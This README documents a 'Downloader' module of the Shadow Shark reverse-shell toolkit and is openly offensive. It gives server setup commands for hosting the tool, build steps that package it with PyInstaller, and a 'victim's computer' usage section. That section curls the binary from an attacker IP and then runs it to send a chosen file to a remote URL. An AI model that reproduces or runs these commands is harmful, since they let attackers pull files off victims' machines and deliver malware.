# Downloader
The <a href="https://github.com/MrSharkSpamBot/ShadowSharkReverseShell">Shadow Shark</a> Downloader module.

## Installation
### Debian
```
$ sudo apt-get install python3 python3-pip git apache2 php libapache2-mod-php
$ sudo service apache2 start
$ cd /var/www/html/
$ sudo git clone https://github.com/BababooeyHackers/Downloader.git
$ sudo chown -R www-data:www-data /var/www/html/Downloader/
$ cd Downloader/
$ pip3 install -r requirements.txt
```
### Arch
```
$ sudo pacman -S python python-pip git apache php php-apache
$ sudo systemctl start httpd
$ cd /srv/http/
$ sudo git clone https://github.com/BababooeyHackers/Downloader.git
$ sudo chown -R www-data:www-data /var/www/html/Downloader/
$ cd Downloader/
$ pip3 install -r requirements.txt
```

## Usage
### On victim's computer
```
$ curl http://IP/hacks/Downloader/Downloader.(exe, app, etc) --output Downloader.(exe, app, etc)
$ Downloader.(exe, app, etc) --file (File) --url (Url to send the file to)
```

## Compilation
This module must be compiled on a Linux computer, Windows computer, Wine environment, or MacOS computer.
```
# First install python3 on your Linux computer, Windows computer, Wine environment, or MacOS computer.
$ pip(3) install -r requirements.txt
$ pyinstaller --onefile --icon icon.ico Downloader.py
```
